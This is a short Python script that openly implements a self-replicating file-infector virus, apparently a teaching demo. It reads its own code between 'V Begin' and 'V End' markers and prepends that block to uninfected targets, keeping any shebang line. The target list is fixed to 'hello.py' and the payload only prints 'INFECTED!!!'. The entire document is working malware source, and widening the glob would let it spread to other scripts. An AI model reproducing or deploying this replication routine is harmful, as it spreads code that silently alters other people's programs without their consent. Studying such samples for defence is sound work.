## V Begin ##
import sys, glob, re

# Get a copy of the V
vCode = []
fh = open(sys.argv[0],"r")
lines = fh.readlines()
fh.close()
inV = False
for line in lines:
    if (re.search('^## V Begin ##', line)): inV = True
    if (inV): vCode.append(line)
    if (re.search('^## V End ##', line)): break

#Find potential vics
progs = glob.glob("hello.py")

#Check and Infect
for prog in progs:
    fh = open(prog,"r")
    pCode = fh.readlines()
    fh.close()
    infected = False
    for line in pCode:
        if("## V Begin ##" in line):
            infected = True
            break
    if not infected:
        newCode = []
        if('#!' in pCode[0]): newCode.append(pCode.pop(0))
        newCode.extend(vCode)
        newCode.extend(pCode)
        #writing new V infected code
        fh = open(prog,'w')
        fh.writelines(newCode)
        fh.close()

#Optional payload
print("INFECTED!!!")

## V End ##